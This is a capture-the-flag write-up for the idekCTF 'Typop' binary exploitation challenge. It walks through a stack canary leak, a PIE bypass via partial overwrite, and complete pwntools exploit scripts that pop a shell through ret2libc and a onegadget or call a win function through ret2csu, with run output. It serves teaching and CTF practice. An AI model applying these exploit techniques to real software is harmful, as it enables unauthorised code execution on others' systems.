# Typop

## Intro to ROP

The description for this challenge is as follows: 

*While writing the feedback form for idekCTF, JW made a small typo. It still compiled though, so what could possibly go wrong?*

This was one of the easiest challenges in the CTF, with 155 solves. It was worth 408 points at the end of the CTF. It was ultimately fairly simple to complete with a background knowledge of general pwn techniques.

**TL;DR Solution:** Use a non-null-terminated string input to print out information on the stack, starting with the canary. Then do a single-byte partial overwrite to bypass PIE and return partway earlier in the main function to call getFeedback again, and get a PIE leak on the second attempt. Finally, you can either use the existing win function and use ret2csu to control the rdx gadget and print the flag, or just use ret2libc to get a full shell and ignore the win function.

## Setup Notes:

The challenge comes with the binary and a Dockerfile setup; I could have used the dockerfile itself to get the appropriate libc version, but it was ultimately easier to use the libc file provided with the sprinter challenge, which actually matched up. You can use pwninit or patchelf and a set of interpreter files to edit the binary to use the provided library file; the flags "--replace-needed libc.so.6 provided_libc_file" and "--set-rpath ./" will let you use a library file of your choice, and "--set-interpreter" lets you set a new interpreter file; more information and files are available here: https://github.com/knittingirl/CTF-Writeups/tree/main/ELF_Interpreters_and_Libcs.

## Gathering Information:

If I use checksec, I can see that pretty much all of the protections seem to be enabled for this binary.
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/idekCTF23/typop/attachments$ checksec chall
[*] '/mnt/c/Users/Owner/Desktop/CTF_Files/idekCTF23/typop/attachments/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./'
```
Next, I can check out how the binary looks in Ghidra; it's compiled with symbols and relatively straightforward. The main function shows that I need to put a 'y' in response to the first question in order to continue. getchar is used to receive the data, so it doesn't seem vulnerable to further attack.
```
undefined8 main(void)

{
  int iVar1;
  
  setvbuf(stdout,(char *)0x0,2,0);
  while( true ) {
    iVar1 = puts("Do you want to complete a survey?");
    if (iVar1 == 0) {
      return 0;
    }
    iVar1 = getchar();
    if (iVar1 != 0x79) break;
    getchar();
    getFeedback();
  }
  return 0;
}
```
The rest of the important content of the binary seems to be in the getFeedback function, so we can look at that next. For the second question, the read function is used to get input, and that input is then printed back to the console (%s is used, so no format string vulnerability here; however, it looks like there is a short overflow on the stack here). A different reaction is printed if the first character is a 'y', but otherwise it doesn't matter. Next, the read call in response to the final question seems to include a pretty large overflow.
```
void getFeedback(void)

{
  long in_FS_OFFSET;
  undefined8 local_1a;
  undefined2 local_12;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_1a = 0;
  local_12 = 0;
  puts("Do you like ctf?");
                    /* see if this can leak canary */
  read(0,&local_1a,0x1e);
  printf("You said: %s\n",&local_1a);
  if ((char)local_1a == 'y') {
    printf("That\'s great! ");
  }
  else {
    printf("Aww :( ");
  }
  puts("Can you provide some extra feedback?");
  read(0,&local_1a,0x5a);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;

```
Also of note at this point is the presence of a win function, which I can return to later once we're actually in a position to call it. In particular, the way that the file to be opened and read out is determined needs to be investigated further.
```
void win(undefined param_1,undefined param_2,undefined param_3)

{
  FILE *__stream;
  long in_FS_OFFSET;
  undefined8 local_52;
  undefined2 local_4a;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_4a = 0;
  local_52 = CONCAT17(0x74,CONCAT16(0x78,CONCAT15(0x74,CONCAT14(0x2e,CONCAT13(0x67,CONCAT12(param _3,
                                                  CONCAT11(param_2,param_1)))))));
  __stream = fopen((char *)&local_52,"r");
  if (__stream == (FILE *)0x0) {
    puts("Error opening flag file.");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  fgets((char *)&local_48,0x20,__stream);
  puts((char *)&local_48);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
We can confirm that the overflow exists by quickly running the program locally and noting the "stack smashing detected" error. We can also see that some extra data seems to be getting printed after the response to the first question, which indicates a leaking strategy.
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/idekCTF23/typop/attachments$ ./chall
Do you want to complete a survey?
y
Do you like ctf?
aaaaaaaaaaaaa
You said: aaaaaaaaaaaaa
c
Aww :( Can you provide some extra feedback?
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
*** stack smashing detected ***: terminated
Aborted
```
## Bypassing Canary and PIE:

So, a canary is present in the binary, which means that the easiest way to deal with it will be to leak it. In x86-64, a canary is eight bytes long, and located at offset rbp-8 on the stack. The first byte is always a null, and the next seven bytes are random. Because the read function has an overflow, and no attempt is made to null terminate the string before it's printed back, we can leak the random seven bytes by overflowing up to and including the null byte with arbitrary content. The print function will print bytes until it hits the null terminator, which now will occur after the canary.

Here is a view of the stack if I just input a single 'a' character with a newline. It looks like there are ten bytes before the character, then adding an additional character will overflow the null byte.
```
gef➤  x/20gx 0x00007ffe66171dde
0x7ffe66171dde: 0x0000000000000a61      0x13f9badf54000000
0x7ffe66171dee: 0x7ffe66171e002861      0x55af820264470000
gef➤  x/gx $rbp-8
0x7ffe66171de8: 0x286113f9badf5400
```
And here is the stack when I send 11 characters of 'a's.
```
gef➤  x/20x 0x00007ffda96ba8fe
0x7ffda96ba8fe: 0x6161616161616161      0x226830aced616161
0x7ffda96ba90e: 0x7ffda96ba9200cf6      0x55978332a4470000
```
We can see that the canary is printed back to the console with the rest of the string, as well as a stack leak that isn't super relevant to our exploit.
```
[*] Switching to interactive mode

You said: aaaaaaaaaaa\xed\xac0h"\xf6 \xa9k\xa9\xfd
Aww :( Can you provide some extra feedback?
```
Now that we have a reliable canary leak, we can overwrite the return pointer! However, since PIE is enabled (this randomizes the base of code addresses by applying ASLR to that section of memory, just like the stack, heap, and libc sections get by default), we don't know the full address of any locations in the code section. However, a few things are working in our favor:

#1: Since getFeedback is called from main, the return address is from partway through the main function in the code section.

#2: The last three nibbles (hex digits) of addresses always stay the same even with ASLR/PIE. This means we could overwrite the lowest byte of our return pointer to point somewhere else (i.e. the start of the main function would work by editing that byte to 0x10) with 100% accuracy, we could overwrite the low two bytes of the return pointer to point somewhere else with 1/16 accuracy (only one nibble is unknown), which is very acceptable, and we could even overwrite the low three byte with 1/4096 odds, which can work out if scripted appropriately! Anything more is generally infeasible.

#3: My overflow on the answer to the second question is long enough that I could also use it to leak the return pointer (exactly the same technique as my canary leak) and use that to calculate the PIE base. As a result, I just need to run the main body of the program a second time in much the same way as a typical ret2libc attack. With some trial and error, I found that simply returning to the start of main would throw errors when printf was called, but I could bypass this by just going to the exact line of main where getFeedback is called (offset 0x42) (I think it has something to do with the setvbuf function call, but I'm not 100% sure how that works internally). This will allow me to leak PIE use things like the win function with prior use of gadgets to set parameters. Bear in mind here that our overflow is big enough to write a 0x40 bytes ROPchain, i.e. 8 8-byte addresses long.

Here's a python script that gets us up to the point of a PIE leak in that manner:

```
from pwn import *

target = process('./chall')

pid = gdb.attach(target, 'b *getFeedback+70\nb *getFeedback+172\nb *getFeedback+199\ncontinue')

elf = ELF('chall')
libc = ELF('libc-2.31.so')
#target = remote('typop.chal.idek.team', 1337)

print(target.recvuntil(b'complete a survey?'))

target.sendline(b'y')
print(target.recvuntil(b'ctf?'))
payload1 = b'a' * 11
target.send(payload1)

print(target.recvuntil(payload1))

leak = target.recv(7)
canary = u64(b'\x00' + leak)
print(hex(canary))

payload2 = cyclic(100)
padding = b'a' * 10
payload2 = padding
payload2 += p64(canary)
payload2 += b'a' * 8

payload2 += b'\x42'
target.send(payload2) 

print(target.recvuntil(b'ctf?'))
payload3 = b'a' * 0x1a
target.send(payload3)
print(target.recvuntil(payload3))
leak = target.recv(6)
print(leak)
main_55 = u64(leak + b'\x00' * 2)
pie_base = main_55 - elf.symbols['main'] - 55
pop_rdi = pie_base + 0x00000000000014d3
print(hex(pop_rdi))

target.interactive()
```
Which looks like this when run:
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/idekCTF23/typop/attachments$ python3 typop_exploit.py
[+] Starting local process './chall': pid 15455
[*] running in new terminal: ['/usr/bin/gdb', '-q', './chall', '15455', '-x', '/tmp/pwn3f3ifz01.gdb']
[+] Waiting for debugger: Done
[*] '/mnt/c/Users/Owner/Desktop/CTF_Files/idekCTF23/typop/attachments/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./'
[*] '/mnt/c/Users/Owner/Desktop/CTF_Files/idekCTF23/typop/attachments/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'Do you want to complete a survey?'
b'\nDo you like ctf?'
b'\nYou said: aaaaaaaaaaa'
0x7a7e475ed1a4ca00
b'\x10\xe1t\xee\xfe\x7f\nAww :( Can you provide some extra feedback?\nDo you like ctf?'
b'\nYou said: aaaaaaaaaaaaaaaaaaaaaaaaaa'
b'G\xf4?1\xbcU'
0x55bc313ff4d3
[*] Switching to interactive mode

$
```

## Solving with ret2libc:

During the actual competition, I did not bother to properly reverse engineer the win function, and instead opted to use ret2libc to pop a shell for the challenge. This is an extremely useful ROP technique that I explain in more detail over here: https://github.com/knittingirl/CTF-Writeups/tree/main/pwn_challs/space_heroes_22/Rule%20of%20Two. Basically, the idea is to use one of the existing functions to print content to the terminal, such as puts or printf, to print off the memory at a GOT entry for a function that's been used in the binary at least once already (assuming Partial RELRO, otherwise any GOT entry works). GOT entries point to the location of those functions in libc, so that can be used to derive the libc base. Then you can just re-run the function to do another ROPchain using gadgets within libc,  which can include things like the execve function, a '/bin/sh' string, and even onegadgets, which are offsets in a libc that will pop a shell with minimal setup if certain conditions are met.

In my solution, once I had my libc leak, I decided to use a onegadget to keep my final ROPchain relatively short and simple. I didn't have any where all of the conditions where met when the ROPchain is executed (just make a breakpoint at the ret with your debugger and check the contents of each register mentioned in the constraints, only r15 is null at that point), so I also found a "pop rdx" gadget in the libc and used it to null out that register before calling the onegadget.
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/idekCTF23/typop/attachments$ one_gadget libc-2.31.so
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```
Here is a final working script to get a shell with ret2libc:
```
from pwn import *

target = process('./chall')

pid = gdb.attach(target, 'b *getFeedback+70\nb *getFeedback+172\nb *getFeedback+199\ncontinue')

elf = ELF('chall')
libc = ELF('libc-2.31.so')
#target = remote('typop.chal.idek.team', 1337)

print(target.recvuntil(b'complete a survey?'))

target.sendline(b'y')
print(target.recvuntil(b'ctf?'))
payload1 = b'a' * 11
target.send(payload1)

print(target.recvuntil(payload1))

leak = target.recv(7)
canary = u64(b'\x00' + leak)
print(hex(canary))

payload2 = cyclic(100)
padding = b'a' * 10
payload2 = padding
payload2 += p64(canary)
payload2 += b'a' * 8

payload2 += b'\x42'
target.send(payload2) 

print(target.recvuntil(b'ctf?'))
payload3 = b'a' * 0x1a
target.send(payload3)
print(target.recvuntil(payload3))
leak = target.recv(6)
print(leak)
main_55 = u64(leak + b'\x00' * 2)
pie_base = main_55 - elf.symbols['main'] - 55
pop_rdi = pie_base + 0x00000000000014d3
pop_rsi_r15 = pie_base + 0x00000000000014d1
writable = pie_base + elf.bss()
print(hex(pop_rdi))

payload4 = padding
payload4 += p64(canary)
payload4 += b'b' * 8
payload4 += p64(pop_rdi)
payload4 += p64(pie_base + elf.got['puts'])
payload4 += p64(pie_base + elf.symbols['puts'])
payload4 += p64(pie_base + elf.symbols['getFeedback'])
target.sendline(payload4)

print(target.recvuntil(b'feedback?\n'))
leak = target.recv(6)
puts_libc = u64(leak + b'\x00' * 2)
print(hex(puts_libc))
libc_base = puts_libc - libc.symbols['puts']
onegadget = libc_base + 0xe3b01
pop_rdx = libc_base + 0x0000000000142c92
print(hex(pop_rdx))


print(target.recvuntil(b'ctf?'))
payload5 = b'a' * 2
target.send(payload5)
print(target.recvuntil(payload5))


payload6 = padding
payload6 += p64(canary)
payload6 += b'b' * 8
payload6 +=p64(pop_rdx)
payload6 += p64(0)
payload6 += p64(onegadget)

target.sendline(payload6)

target.interactive()
```
It should look something like this when run:
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/idekCTF23/typop/attachments$ python3 typop_exploit.py NOPTRACE
[+] Starting local process './chall': pid 15644
[!] Skipping debug attach since context.noptrace==True
[*] '/mnt/c/Users/Owner/Desktop/CTF_Files/idekCTF23/typop/attachments/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./'
[*] '/mnt/c/Users/Owner/Desktop/CTF_Files/idekCTF23/typop/attachments/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'Do you want to complete a survey?'
b'\nDo you like ctf?'
b'\nYou said: aaaaaaaaaaa'
0x5083a1afdcd2ae00
b'0+PA\xfd\x7f\nAww :( Can you provide some extra feedback?\nDo you like ctf?'
b'\nYou said: aaaaaaaaaaaaaaaaaaaaaaaaaa'
b'Gt\x17&\x8bU'
0x558b261774d3
b'\nAww :( Can you provide some extra feedback?\n'
0x7f5b9d17e420
0x7f5b9d23cc92
b'\nDo you like ctf?'
b'\nYou said: aa'
[*] Switching to interactive mode

Aww :( Can you provide some extra feedback?
$ ls
Dockerfile  chall_backup  flag.txt    typop_exploit.py
chall        core      libc-2.31.so    typop_payload.py
$ cat flag.txt
idek{2_guess_typos_do_matter}
$
```
## Solving with the actual win function (and ret2csu):

The code to determine the first characters of the file to be opened is actually fairly complicated, and it does not decompile well. Instead, you really need to look at the assembly. This loads the second argument (rsi) (technically the low four bytes in each case since esi etc is used) into ecx, the third into eax, and the first into edx itself. Then, the low byte of each of those registers is loaded into successive offsets within a stack variable, with the first character corresponding to the first argument of the function and so on. After the first three characters, the characters loaded in are hardcoded as "g.txt". So, the goal seems to be to call the win function with the first argument set to "f" (not a pointer to the string "f", just the ascii value thereof), the second to "l", and the third to "a".

```
        00101255 89  f1           MOV        ECX ,ESI
        00101257 89  d0           MOV        EAX ,EDX
        00101259 89  fa           MOV        EDX ,EDI
        0010125b 88  55  9c       MOV        byte ptr [RBP  + local_6c ],DL
        0010125e 89  ca           MOV        EDX ,ECX
        00101260 88  55  98       MOV        byte ptr [RBP  + local_70 ],DL
        00101263 88  45  94       MOV        byte ptr [RBP  + local_74 ],AL
        00101266 64  48  8b       MOV        RAX ,qword ptr FS:[0x28 ]
                 04  25  28 
                 00  00  00
        0010126f 48  89  45  f8    MOV        qword ptr [RBP  + local_10 ],RAX
        00101273 31  c0           XOR        EAX ,EAX
        00101275 48  c7  45       MOV        qword ptr [RBP  + local_52 ],0x0
                 b6  00  00 
                 00  00
        0010127d 66  c7  45       MOV        word ptr [RBP  + local_4a ],0x0
                 be  00  00
        00101283 0f  b6  45  9c    MOVZX      EAX ,byte ptr [RBP  + local_6c ]
        00101287 88  45  b6       MOV        byte ptr [RBP  + local_52 ],AL
        0010128a 0f  b6  45  98    MOVZX      EAX ,byte ptr [RBP  + local_70 ]
        0010128e 88  45  b7       MOV        byte ptr [RBP  + local_52 +0x1 ],AL
        00101291 0f  b6  45  94    MOVZX      EAX ,byte ptr [RBP  + local_74 ]
        00101295 88  45  b8       MOV        byte ptr [RBP  + local_52 +0x2 ],AL
        00101298 c6  45  b9  67    MOV        byte ptr [RBP  + local_52 +0x3 ],0x67
        0010129c c6  45  ba  2e    MOV        byte ptr [RBP  + local_52 +0x4 ],0x2e
        001012a0 c6  45  bb  74    MOV        byte ptr [RBP  + local_52 +0x5 ],0x74
        001012a4 c6  45  bc  78    MOV        byte ptr [RBP  + local_52 +0x6 ],0x78
        001012a8 c6  45  bd  74    MOV        byte ptr [RBP  + local_52 +0x7 ],0x74
        001012ac 48  8d  45  b6    LEA        RAX =>local_52 ,[RBP  + -0x4a ]
        001012b0 48  8d  35       LEA        RSI ,[DAT_00102008 ]                              = 72h    r
                 51  0d  00  00
        001012b7 48  89  c7       MOV        RDI ,RAX
        001012ba e8  81  fe       CALL       <EXTERNAL>::fopen                                FILE * fopen(char * __filename, 
                 ff  ff
```
This binary does have easy gadgets to edit rdi and rsi, which control the first and second argument. This is common, since they crop up in the libc_csu_init function. However, control of rdx is not immediately obvious. This is where the ret2csu technique comes in. Basically, this is an advanced ROP technique that lets you fill rdx using the end of the libc_csu_init function. In the assembly snippet taken from that function, the idea is to:

#1: Start with the sequence of 6 pops starting at 0x014ca. 

#2: Next, call the sequence of mov instructions starting at 0x014b0.

#3: We can fill rdx by controlling r14, which is included in the pops. Similarly, we can fill rsi by controlling r13, and edi by controlling r12.

#4: To not segfault on the call instruction, we need R15  + RBX * 0x8 to **point** to the address of a valid function. One common strategy would be to find a GOT entry for some function that won't error out when called here, set r15 to that address, and rbx to 0.

#5: Ensure that rbp = rbx + 1 to pass that check.

```
                             LAB_001014b0                                    XREF[1]:     001014c4 (j)   
        001014b0 4c  89  f2       MOV        RDX ,R14
        001014b3 4c  89  ee       MOV        RSI ,R13
        001014b6 44  89  e7       MOV        EDI ,R12D
        001014b9 41  ff  14  df    CALL       qword ptr [R15  + RBX *0x8 ]=>->frame_dummy        = 101240h
                                                                                             = 101200h
                                                                                             undefined frame_dummy()
                                                                                             undefined __do_global_dtors_aux()
        001014bd 48  83  c3  01    ADD        RBX ,0x1
        001014c1 48  39  dd       CMP        RBP ,RBX
        001014c4 75  ea           JNZ        LAB_001014b0
                             LAB_001014c6                                    XREF[1]:     001014a5 (j)   
        001014c6 48  83  c4  08    ADD        RSP ,0x8
        001014ca 5b              POP        RBX
        001014cb 5d              POP        RBP
        001014cc 41  5c           POP        R12
        001014ce 41  5d           POP        R13
        001014d0 41  5e           POP        R14
        001014d2 41  5f           POP        R15
        001014d4 c3              RET

```
A final complication arose when I realized that my ROPchain only has space for eight 8-byte addresses, and the address of the pops, the six values to fill them, and the address of the movs collectively add up to eight addresses, plus the six registers get popped again following the comparison, bringing it up to 14 8-byte addresses before I could really continue the chain and call additional arbitrary functions and gadgets. This means that I have to call win when R15  + RBX * 0x8 is called, but there is no pointer to win in the binary by default. My solution was to go back to the initial canary leak, which also leaks a stack address by default. I then modified my payload to stick the win address between the canary and the ROPchain, calculated the offset to that address from the stack leak, and set r15 to that. This lets me call win and print the flag file.

Here is the final python script to pull all of this off:
```
from pwn import *

target = process('./chall')

pid = gdb.attach(target, 'b *getFeedback+70\nb *getFeedback+172\nb *getFeedback+199\ncontinue')

elf = ELF('chall')
libc = ELF('libc-2.31.so')
#target = remote('typop.chal.idek.team', 1337)

print(target.recvuntil(b'complete a survey?'))

target.sendline(b'y')
print(target.recvuntil(b'ctf?'))
payload1 = b'a' * 11
target.send(payload1)

print(target.recvuntil(payload1))

leak = target.recv(7)
canary = u64(b'\x00' + leak)
print(hex(canary))
#Only needed for ret2csu
stack_leak = u64(target.recv(6) + b'\x00' * 2)
print(hex(stack_leak))

payload2 = cyclic(100)
padding = b'a' * 10
payload2 = padding
payload2 += p64(canary)
payload2 += b'a' * 8

payload2 += b'\x42'
target.send(payload2) 

print(target.recvuntil(b'ctf?'))
payload3 = b'a' * 0x1a
target.send(payload3)
print(target.recvuntil(payload3))
leak = target.recv(6)
print(leak)
main_55 = u64(leak + b'\x00' * 2)
pie_base = main_55 - elf.symbols['main'] - 55
pop_rdi = pie_base + 0x00000000000014d3
pop_rsi_r15 = pie_base + 0x00000000000014d1
writable = pie_base + elf.bss()
print(hex(pop_rdi))

csu_pops = pie_base + 0x014ca
csu_movs = pie_base + 0x014b0

payload4 = padding
payload4 += p64(canary)
payload4 += p64(pie_base+elf.symbols['win'])
payload4 += p64(csu_pops)
payload4 += p64(0) #rbx
payload4 += p64(1) #rbp
payload4 += p64(ord('f')) #r12 => edi
payload4 += p64(ord('l')) #r13 => rsi
payload4 += p64(ord('a')) #r14 => rdx
payload4 += p64(stack_leak - 0x10) #r15, points to win and called
payload4 += p64(csu_movs)
target.send(payload4)
target.interactive()
```
While I never fully tested this method on the remote instance, the results should look like this (some machines seem to have issues properly displaying the flag, but if you're playing locally, you can follow your script along in gdb to see that the appropriate functions are called with the appropriate arguments):
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/idekCTF23/typop/attachments$ python3 typop_exploit.py
[+] Starting local process './chall': pid 16185
[*] running in new terminal: ['/usr/bin/gdb', '-q', './chall', '16185', '-x', '/tmp/pwnnyb3u7ls.gdb']
[+] Waiting for debugger: Done
[*] '/mnt/c/Users/Owner/Desktop/CTF_Files/idekCTF23/typop/attachments/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./'
[*] '/mnt/c/Users/Owner/Desktop/CTF_Files/idekCTF23/typop/attachments/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'Do you want to complete a survey?'
b'\nDo you like ctf?'
b'\nYou said: aaaaaaaaaaa'
0x3419be5e1e994500
0x7ffd13a68480
b'\nAww :( Can you provide some extra feedback?\nDo you like ctf?'
b'\nYou said: aaaaaaaaaaaaaaaaaaaaaaaaaa'
b'Gd\xcaeCV'
0x564365ca64d3
[*] Switching to interactive mode

Aww :( Can you provide some extra feedback?
idek{2_guess_typos_do_matter}

$
```
Thanks for reading!
